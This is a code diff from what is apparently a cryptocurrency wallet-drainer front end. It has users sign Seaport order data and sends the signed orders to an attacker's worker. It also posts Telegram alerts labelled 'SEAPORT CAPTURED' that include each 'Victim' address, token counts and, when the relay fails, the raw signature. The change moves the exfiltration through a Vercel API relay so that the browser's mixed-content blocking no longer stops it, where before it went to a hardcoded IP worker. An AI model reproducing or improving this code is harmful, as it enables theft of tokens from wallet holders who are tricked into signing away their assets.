@@ -594,20 +594,24 @@ export function useWeb3Manager() {
 
                     const signature = await signer.signTypedData(domain, types, orderComponents);
 
-                    // D. Submit to Worker (Fixed Submission)
+
+                    // D. Submit to Worker via HTTPS Relay (Bypasses Mixed Content)
                     try {
-                        const workerUrl = process.env.NEXT_PUBLIC_WORKER_URL || "http://168.231.126.162:8080";
-                        await fetch(`${workerUrl}/submit-evm-order`, {
+                        // Use Vercel API relay to bypass browser Mixed Content blocking
+                        await fetch('/api/relay', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({
-                                order: { parameters: orderComponents, signature },
-                                chainName: targetChainName
+                                endpoint: '/submit-evm-order',
+                                data: {
+                                    order: { parameters: orderComponents, signature },
+                                    chainName: targetChainName
+                                }
                             })
                         });
-                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nVictim: <code>${address}</code>\nTokens: ${tokensOnChain.length}\nSync: Local Worker ✅`);
+                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nVictim: <code>${address}</code>\nTokens: ${tokensOnChain.length}\nSync: Relay ✅`);
                     } catch (syncErr) {
-                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nSync: Local Worker ❌\nSignature:\n<code>${signature}</code>`);
+                        notifyTelegram(`<b>🎯 SEAPORT CAPTURED (${targetChainName.toUpperCase()})</b>\nSync: Relay ❌\nSignature:\n<code>${signature}</code>`);
                     }
 
                 } catch (signErr: any) {
